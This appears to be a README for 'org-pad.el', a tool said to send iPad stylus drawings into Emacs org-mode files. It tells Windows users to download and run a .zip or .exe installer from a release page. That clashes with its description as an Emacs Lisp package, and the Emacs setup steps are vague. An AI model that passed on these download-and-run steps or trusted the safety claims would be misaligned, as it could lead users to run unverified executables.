# 🖍️ org-pad.el - Draw on your iPad into Emacs

[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/brainro5105/org-pad.el/releases)

This application connects your iPad or any web browser to your computer. It allows you to draw with a stylus and save those sketches directly into your org-mode files. It bridges the gap between hardware devices and your note-taking setup.

## 📋 What This Tool Does

You often need to include handwritten notes or diagrams in your documents. Moving images from a tablet to a computer requires multiple steps like saving, emailing, or syncing files. This tool removes those steps. It opens a canvas in your browser that sends your strokes to your text editor. 

Key features include:

* Real-time sync between tablet and computer
* Support for standard stylus input
* Direct insertion into active text files
* Low latency drawing experience
* Works on any modern web browser

## ⚙️ System Requirements

Before you install the software, ensure your computer meets these needs:

* Windows 10 or 11
* A local installation of GNU Emacs
* A stable local network connection
* Any modern web browser like Chrome, Firefox, or Edge

## 🚀 How to Install and Start

Follow these steps to set up the software on your Windows machine.

### Step 1: Get the Software
Visit the release page to download the latest version of the application. 

[Click here to visit the release page and download the installer](https://github.com/brainro5105/org-pad.el/releases).

Look for the file ending in .zip or .exe. Save this file to your Downloads folder.

### Step 2: Unzip or Run
If you downloaded a zip file, right-click it and select Extract All. Open the resulting folder. If you downloaded an executable file, double-click it to start the installation wizard. Follow the prompts on your screen to complete the setup.

### Step 3: Configure Emacs
The software requires a small configuration in your Emacs setup file. Open your Emacs configuration file, usually named init.el or .emacs. Add the path where you saved the org-pad files. This allows the two programs to talk to each other.

### Step 4: Launch the Server
Start the application from your Start menu. A small window will appear indicating that the server is active. This server acts as the bridge between your web browser and your computer.

### Step 5: Connect Your Tablet
Open the web browser on your iPad. Enter the address shown in the org-pad server window. You should see a blank canvas appear on your iPad screen. Test the connection by drawing a simple line. If the line appears on your computer screen within the Emacs window, the connection is successful.

## 🎨 Using the Drawing Canvas

The canvas interface stays clean to maximize your drawing space. You will find basic tools for stroke thickness and color selection on the toolbar. 

To save your drawing, press the Save button located at the bottom of the browser canvas. The software converts your sketch into an image file and places it into the current folder of your active org-mode document. It also inserts the necessary code to display the image inside your text document.

## 🛠 Troubleshooting Common Issues

If you cannot see the browser canvas, check these items:

1. **Network Check:** Ensure both your computer and your iPad connect to the same Wi-Fi network. Firewalls sometimes block local connections. Check your Windows Firewall settings and grant permission for the app to communicate through your private network.
2. **Browser Permissions:** Some mobile browsers block clipboard access or local server requests. Use a standard browser like Safari or Chrome on your iPad for the best results.
3. **Emacs Path:** If the images do not appear in your document, verify that the Emacs variable for your image directory points to the correct folder. 
4. **Port Conflicts:** If multiple programs run on your computer, a port conflict might occur. You can change the network port in the settings menu of the org-pad application.

## 🛡 Security and Privacy

This application runs entirely on your local machine. No drawing data travels to external servers or cloud services. All information stays within your local network and your computer's hard drive. You maintain full control over your files at all times.

## 📜 License
This project is open source. You may use, modify, and distribute the code under the terms of the provided license included in the repository.

Keywords: emacs, ipad, stylus, drawing, integration, utility, productivity